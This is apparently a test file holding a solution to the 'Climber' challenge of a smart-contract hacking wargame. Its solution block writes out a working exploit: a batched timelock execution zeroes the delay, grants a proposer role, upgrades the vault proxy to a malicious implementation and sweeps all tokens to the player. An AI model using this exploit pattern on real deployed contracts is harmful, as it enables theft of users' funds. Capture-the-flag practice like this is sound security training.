const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");
const {
  setBalance,
  time
} = require("@nomicfoundation/hardhat-network-helpers");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, player;
  let timelock, vault, token;

  const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
  const TIMELOCK_DELAY = 60 * 60;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await vault.getSweeper()).to.eq(sweeper.address);
    expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
    expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await vault.owner();
    timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock delay is correct and cannot be changed
    expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
    await expect(
      timelock.updateDelay(TIMELOCK_DELAY + 1)
    ).to.be.revertedWithCustomError(timelock, "CallerNotTimelock");

    // Ensure timelock roles are correctly initialized
    expect(
      await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), deployer.address)
    ).to.be.true;
    expect(
      await timelock.hasRole(ethers.utils.id("ADMIN_ROLE"), timelock.address)
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    let test = ethers.utils.hexZeroPad("0x00", 32);
    const abi = ethers.utils.defaultAbiCoder;
    let maliciousVaultFactory = await ethers.getContractFactory(
      "MaliciousVault",
      player
    );
    let maliciousVault = await maliciousVaultFactory.deploy();
    let attackerFactory = await ethers.getContractFactory("Attacker_Climber");
    let attacker = await attackerFactory.deploy(
      timelock.address,
      vault.address,
      token.address,
      maliciousVault.address,
      player.address
    );
    // We need to encode the function  parameters
    // https://github.com/ethers-io/ethers.js/issues/478
    let updateDelayABI = [`function updateDelay(uint64 newDelay)`];
    let iface = new ethers.utils.Interface(updateDelayABI);
    let nextDelayEncoded = iface.encodeFunctionData("updateDelay", [0]);
    let grantRoleABI = [`function grantRole(bytes32 role, address account)`];
    let iface2 = new ethers.utils.Interface(grantRoleABI);
    let grantRoleEncoded = iface2.encodeFunctionData("grantRole", [
      "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
      attacker.address
    ]);
    let scheduleAttackABI = [`function attack()`];
    let iface3 = new ethers.utils.Interface(scheduleAttackABI);
    let scheduleAttackEncoded = iface3.encodeFunctionData("attack", []);
    let upgradeProxyABI = [`function upgradeTo(address newImplementation)`];
    let iface4 = new ethers.utils.Interface(upgradeProxyABI);
    let upgradeToEncoded = iface4.encodeFunctionData("upgradeTo", [
      maliciousVault.address
    ]);
    let addingDataArray = await attacker
      .connect(player)
      .data(
        [timelock.address, timelock.address, vault.address, attacker.address],
        [0, 0, 0, 0],
        [
          nextDelayEncoded,
          grantRoleEncoded,
          upgradeToEncoded,
          scheduleAttackEncoded
        ]
      );
    let executeTx = await timelock
      .connect(player)
      .execute(
        [timelock.address, timelock.address, vault.address, attacker.address],
        [0, 0, 0, 0],
        [
          nextDelayEncoded,
          grantRoleEncoded,
          upgradeToEncoded,
          scheduleAttackEncoded
        ],
        ethers.utils.hexZeroPad("0x00", 32)
      );
    await vault.connect(player).sweepFunds(token.address);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
